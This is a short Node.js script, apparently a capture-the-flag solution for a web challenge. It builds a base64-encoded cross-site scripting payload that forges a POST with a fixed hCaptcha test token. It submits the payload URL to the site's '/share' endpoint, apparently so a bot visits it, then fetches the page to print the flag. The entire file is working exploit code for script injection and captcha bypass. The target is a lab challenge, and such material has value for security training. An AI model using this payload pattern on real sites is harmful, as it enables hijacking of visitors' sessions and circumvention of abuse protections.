import fetch from 'node-fetch';

const xssPayload = `
fetch('/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'h-captcha-response=10000000-aaaa-bbbb-cccc-000000000001'
})
`;

const encodedPayload = Buffer.from(xssPayload).toString('base64');
const url = `https://web-hcaptcha-06530mbc.amt.rs/?xss=${encodedPayload}`;

async function solve() {
    console.log('Sending request to /share to set show=true');
    await fetch('https://web-hcaptcha-06530mbc.amt.rs/share', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            url: url
        })
    });

    console.log('Sending request to / to get the flag');
    const res = await fetch('https://web-hcaptcha-06530mbc.amt.rs/');
    const text = await res.text();
    console.log(text);
}

solve();